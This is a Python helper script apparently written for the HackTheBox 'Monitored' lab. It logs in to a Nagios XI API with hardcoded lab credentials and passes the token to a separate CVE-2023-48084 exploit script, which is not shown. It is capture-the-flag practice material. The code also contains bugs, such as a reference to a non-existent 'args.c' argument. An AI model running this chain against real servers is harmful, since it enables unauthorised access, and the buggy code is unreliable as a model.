#!/usr/bin/python3
import requests
import argparse
import subprocess
# from bs4 import BeautifulSoup
# import re
import sys

sys.path.append('../')  # imports the dependency
url_auth = 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/'
url = 'https://nagios.monitored.htb/nagiosxi/'
apiPayload = {'username=svc&password=XjH7VCehowpR1xZB'}
auth_token = 'temp'  # initiate global variable, why do I have to assign something to it? No clue.


def authenticate(url_auth):
    apiPayload = {'username': 'svc', 'password': 'XjH7VCehowpR1xZB'}
    response = requests.post(url_auth, data=apiPayload, allow_redirects=True, verify=False)
    if response.status_code == 200:
        print("Authentication successful")
        auth_token = response.json().get('auth_token')
        return auth_token
    else:
        print("Authentication failed")
        return None


auth_token = authenticate(url_auth)
print("Auth token:", auth_token)


# def extract_token(response_text):
#   match = re.search(r'auth_token:\s*"(.+?)"', response_text)
#  if match:
#     return match.group(1)
# else:
#   print("Token not found in response")
#  return None

# python3 CVE-2023-48084.py --url https://monitored.htb/nagiosxi -a <token>
# BeautifulSoup(x.text)
# print(BeautifulSoup(x.content)) #to string, unicode support for weird asian characters and such

# sys.path.append('CVE-2023-48084.py')


def main(url, auth_token):
    print("Parameter 1:", url)  # debug
    print("Parameter 2:", auth_token)  # debug


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Description of your script')
    parser.add_argument('--url', help='Description of parameter 1', required=True)
    parser.add_argument('-a', help='Description of parameter 2', required=True)
    args = parser.parse_args()

    if auth_token:
        main(args.url, args.c)
        subprocess.run(["python3", "CVE-2023-48084/CVE-2023-48084.py", "--url", args.url, "-a", auth_token])
        # exec(open("CVE-2023-48084/CVE-2023-48084.py").read())
    else:
        print("Error: Authentication failed or token not found.")
